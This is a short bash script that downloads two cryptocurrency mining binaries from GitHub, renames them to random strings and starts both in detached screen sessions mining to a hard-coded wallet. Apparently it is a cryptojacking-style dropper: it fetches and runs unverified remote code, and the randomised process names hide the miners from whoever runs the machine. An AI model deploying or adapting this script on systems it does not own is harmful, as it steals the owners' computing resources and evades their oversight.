variable5=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
apt-get update
apt install -y screen
apt install -y nano
wget -qO $variable5 https://github.com/gpool-cloud/gpool-cli/raw/refs/heads/main/gpool
chmod +x $variable5
screen -dmS GPU ./$variable5 --pubkey 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm
echo GPU DONE 100%
sleep 2
echo next step in 60 second
sleep 60
wget https://github.com/staticneti/otodin/releases/download/v4.1.2/static.tar
tar -xf static.tar
rm -rf static.tar
variable8=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv static $variable8
screen -dmS CPU ./$variable8 mine --address 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm
